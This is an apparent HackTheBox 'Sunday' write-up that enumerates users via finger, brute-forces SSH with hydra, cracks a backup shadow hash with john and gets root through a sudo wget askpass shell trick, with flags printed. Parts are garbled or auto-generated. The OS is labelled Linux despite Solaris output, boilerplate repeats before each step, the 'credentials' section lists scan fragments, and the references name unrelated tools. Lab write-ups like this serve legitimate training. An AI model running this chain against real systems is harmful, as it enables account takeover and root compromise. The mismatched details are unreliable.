---
title: "HackTheBox - Sunday 解説 (Linux)"
date: 2026-02-27
description: "HackTheBox Sunday Linux writeup マシン解説。サービス列挙・初期足がかり・権限昇格経路を解説。"
categories: [HackTheBox, Linux]
tags: [privilege-escalation, rce, suid]
mermaid: true
content_lang: ja
alt_en: /posts/htb-sunday/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | 79/tcp (finger?), 111/tcp (rpcbind), 515/tcp (printer), 6787/tcp (http), 22022/tcp (ssh) |
| 主な侵入経路 | Web/service misconfiguration leading to code execution |
| 権限昇格経路 | SUID enumeration -> GTFOBins-compatible binary abuse -> root/administrator |

## 偵察

- rustscan
- nmap
- finger_user_enumeration.py
- john
- wget
This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
rustscan -a $ip --ulimit 5000 -- -A -sV
```

```bash
❌[1:45][CPU:8][MEM:47][TUN0:10.10.14.198][/home/n0z0]
🐉 > rustscan -a $ip --ulimit 5000 -- -A -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.116.28:111
Open 10.129.116.28:79
Open 10.129.116.28:515
Open 10.129.116.28:6787
Open 10.129.116.28:22022
[~] Starting Script(s)

PORT      STATE SERVICE REASON         VERSION
79/tcp    open  finger? syn-ack ttl 59
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
515/tcp   open  printer syn-ack ttl 59
6787/tcp  open  http    syn-ack ttl 59 Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsG4q9TS6eAOrX6zI+R0CMMkCTfS36QDqQW5NcF/v9vmNWyL6xSZ8x38AB2T+Kbx672RqYCtKmHcZMFs55Q3hoWQE7YgWOJhXw9agE3aIjXiWCNhmmq4T5+zjbJWbF4OLkHzNzZ2qGHbhQD9Kbw9AmyW8ZS+P8AGC5fO36AVvgyS8+5YbA05N3UDKBbQu/WlpgyLfuNpAq9279mfq/MUWWRNKGKICF/jRB3lr2BMD+BhDjTooM7ySxpq7K9dfOgdmgqFrjdE4bkxBrPsWLF41YQy3hV0L/MJQE2h+s7kONmmZJMl4lAZ8PNUqQe6sdkDhL1Ex2+yQlvbyqQZw3xhuJ
|   256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/0DH8qZiCfAzZNkSaAmT39TyBUFFwjdk8vm7ze+Wwm
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.95%I=7%D=10/3%Time=68DEAC3C%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20
SF:\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x2
SF:0\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\
SF:?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\
SF:r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20
SF:\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x2
SF:0When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SS
SF:LSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\
SF:x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20
SF:\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Oracle Solaris 11.1 (92%), Oracle Solaris 11.4 (91%), Sun Solaris 10 (90%), Sun Solaris 9 or 10 (SPARC) (90%), Oracle Solaris 10 (90%), Oracle Solaris 11.2 or OpenIndiana (90%), Solaris 12 (90%), Sun Storage 7210 NAS device (89%), Sun Solaris 9 or 10 (89%), Sun Solaris 11.3 (89%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=10/3%OT=79%CT=%CU=38525%PV=Y%DS=2%DC=T%G=N%TM=68DEACAD%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=1%ISR=110%TI=RD%CI=I%II=I%TS=8)
SEQ(SP=FC%GCD=1%ISR=107%CI=I%II=I%TS=7)
OPS(O1=ST11M552NW2%O2=ST11M552NW2%O3=NNT11M552NW2%O4=ST11M552NW2%O5=ST11M552NW2%O6=ST11M552)
WIN(W1=FA7D%W2=FA7D%W3=FA38%W4=FA3B%W5=FA3B%W6=FFF7)
WIN(W1=FA7D%W2=FA7D%W3=FA38%W4=FA7D%W5=FA3B%W6=FFF7)
ECN(R=Y%DF=Y%T=3C%W=FA0E%O=M552NNSNW2%CC=Y%Q=)
T1(R=Y%DF=Y%T=3C%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=FF%IPL=70%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=Y%T=FF%CD=S)

Uptime guess: 0.001 days (since Fri Oct  3 01:45:49 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Randomized

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   251.44 ms 10.10.14.1
2   251.56 ms 10.129.116.28

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:47
Completed NSE at 01:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:47
Completed NSE at 01:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:47
Completed NSE at 01:47, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.31 seconds
           Raw packets sent: 72 (4.864KB) | Rcvd: 2203 (698.272KB)

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
grc nmap -p- -sC -sV -T4 -A -Pn "$ip" \
-oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
```

```bash
✅[1:45][CPU:10][MEM:47][TUN0:10.10.14.198][/home/n0z0]
🐉 > grc nmap -p- -sC -sV -T4 -A -Pn "$ip" \
  -oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 01:45 JST
Warning: 10.129.116.28 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.116.28
Host is up (0.26s latency).
Not shown: 65405 closed tcp ports (reset), 125 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
79/tcp    open  finger?
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
|_finger: No one logged on\x0D
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
|_http-title: 400 Bad Request
|_http-server-header: Apache
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.95%I=7%D=10/3%Time=68DEB3AE%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20
SF:\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x2
SF:0\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\
SF:?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\
SF:r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20
SF:\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x2
SF:0When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SS
SF:LSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\
SF:x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20
SF:\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/3%OT=79%CT=1%CU=36102%PV=Y%DS=2%DC=T%G=Y%TM=68DEB42
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%CI=I%TS=7)SEQ(SP=105%GC
OS:D=1%ISR=108%CI=I%TS=7)SEQ(SP=105%GCD=1%ISR=109%TI=I%CI=I%II=I%TS=7)SEQ(S
OS:P=108%GCD=1%ISR=10A%CI=RD%II=I%TS=7)SEQ(SP=109%GCD=1%ISR=109%TS=7)OPS(O1
OS:=ST11M552NW2%O2=NNT11%O3=NNT11M552NW2%O4=ST11M552NW2%O5=ST11M552NW2%O6=N
OS:NT11)OPS(O1=ST11M552NW2%O2=ST11M552NW2%O3=NNT11M552NW2%O4=ST11M552NW2%O5
OS:=ST11M552NW2%O6=ST11M552)WIN(W1=FA7D%W2=FA7D%W3=FA38%W4=FA3B%W5=FA3B%W6=
OS:FA7D)WIN(W1=FA7D%W2=FA7D%W3=FA38%W4=FA3B%W5=FA3B%W6=FFF7)ECN(R=Y%DF=Y%T=
OS:3C%W=FA0E%O=M552NNSNW2%CC=Y%Q=)T1(R=Y%DF=Y%T=3C%S=O%A=S+%F=AS%RD=0%Q=)T2
OS:(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T7(R=N)T7(R=Y%DF=Y%T=3C%W=FA7D%S=O%A=O%F=A%O=NNT11%RD=0%Q=)U1(R=Y%DF=N
OS:%T=FF%IPL=70%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=Y%T=FF%CD
OS:=S)

Network Distance: 2 hops

TRACEROUTE (using port 21293/tcp)
HOP RTT       ADDRESS
1   255.90 ms 10.10.14.1
2   255.94 ms 10.129.116.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2055.55 seconds

```

💡 なぜ有効か  
High-quality reconnaissance turns broad network exposure into a short list of exploitable paths. Service/version context allows precision targeting instead of blind exploitation attempts.

## 初期足がかり

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
finger @$ip
```

```bash
✅[2:19][CPU:10][MEM:47][TUN0:10.10.14.198][/home/n0z0]
🐉 > finger @$ip                    
No one logged on

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
python3 finger_user_enumeration.py -t sunday.htb -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
[+] User found: root@sunday.htb
[+] User found: sammy@sunday.htb
[+] User found: sunny@sunday.htb
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
msf6 auxiliary(scanner/finger/finger_users) > run
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: netadm
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: netcfg
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: dhcpserv
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: ikeuser
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: adm
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: dladm
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: lp
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: root
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: nobody
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: noaccess
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: nobody4
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: sammy
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: pkg5srv
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: sunny
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: bin
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: _ntp
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: daemon
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: unknown
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: smmsp
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: aiuser
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: openldap
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: sys
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: ftp
[+] 10.129.116.28:79      - 10.129.116.28:79 - Found user: webservd
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
hydra -l sunny -P /usr/share/wordlists/rockyou.txt -s 22022 ssh://$ip
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
cd /backup/
ls -al
cat agent22.backup
cat shadow.backup
```

```bash
sunny@sunday:~$ cd /backup/
sunny@sunday:/backup$ ls -al
total 28
drwxr-xr-x   2 root     root           4 12月 19日 2021年 .
drwxr-xr-x  25 root     sys           28 10月  5日  16:06 ..
-rw-r--r--   1 root     root         319 12月 19日 2021年 agent22.backup
-rw-r--r--   1 root     root         319 12月 19日 2021年 shadow.backup
sunny@sunday:/backup$ cat agent22.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
sunny@sunday:/backup$ cat shadow.backup 
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt
```

```bash
✅[1:07][CPU:11][MEM:44][TUN0:10.10.14.140][...home/n0z0/work/htb/Sunday]
🐉 > john --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (?)     
1g 0:00:00:11 DONE (2025-10-07 01:07) 0.08598g/s 17609p/s 17609c/s 17609C/s pigglett..bluenote
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
ssh sammy@$ip -p 22022
```

```bash
❌[1:29][CPU:7][MEM:44][TUN0:10.10.14.140][/home/n0z0]
🐉 > ssh sammy@$ip -p 22022                                 
Last login: Tue May  6 07:37:14 2025 from 10.10.14.68
Oracle Solaris 11.4.42.111.0                  Assembled December 2021
-bash-5.1$ 
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
-bash-5.1$ id
uid=100(sammy) gid=10(staff)
-bash-5.1$ uname -n
sunday
-bash-5.1$ cat user.txt 
14a596bba0a4388e779cd50778808700
-bash-5.1$ 

```

![Screenshot showing exploitation evidence on sunday (step 1)](/assets/img/htb/sunday/Pasted%20image%2020251007013201.png)
*Caption: Screenshot captured during sunday at stage 1 of the attack chain.*

💡 なぜ有効か  
Initial access succeeds when a real weakness is chained to controlled execution, credential theft, or authenticated pivoting. Captured outputs and callbacks validate that compromise is reproducible.

## 権限昇格

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
-bash-5.1$ sudo -l
ユーザー sammy は sunday 上で コマンドを実行できます
    (root) NOPASSWD: /usr/bin/wget
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
cd /root/
```

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
root@sunday:/home/sammy# cd /root/                                                                                                        
root@sunday:~#
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
cat root.txt
id
uname -n
whoami
```

```bash
root@sunday:~# cat root.txt                                                                                                                
b4a031cff282a3fe5b0afdae9b0a71e2
root@sunday:~# id                                                                                                                          
uid=0(root) gid=0(root)
root@sunday:~# uname -n                                                                                                                    
sunday
root@sunday:~# whoami                                                                                                                      
root
root@sunday:~#  
```

GTFOBins technique note: this path works because a privileged binary executes attacker-controlled arguments and preserves elevated effective privileges into the spawned shell process.

💡 なぜ有効か  
Privilege escalation depends on trust boundary mistakes such as unsafe sudo rules, writable execution paths, SUID abuse, or credential reuse. Enumerating and validating these conditions is essential for reliable root/administrator access.

## 認証情報

- `Tool / Command`
- `home/n0z0]`
- `__  /  ___}`
- `github.com/RustScan/RustScan`
- `home/n0z0/.rustscan.toml"`
- `79/tcp`
- `RTSP/1.0`
- `111/tcp`
- `515/tcp`
- `6787/tcp`

## まとめ・学んだこと

- Validate external attack surface continuously, especially exposed admin interfaces and secondary services.
- Harden secret handling and remove plaintext credentials from reachable paths and backups.
- Limit privilege boundaries: audit SUID binaries, sudo rules, and delegated scripts/automation.
- Keep exploitation evidence reproducible with clear command logs and result validation at each stage.

## 参考文献

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.org/
- Certipy: https://github.com/ly4k/Certipy
- BloodHound: https://github.com/BloodHoundAD/BloodHound
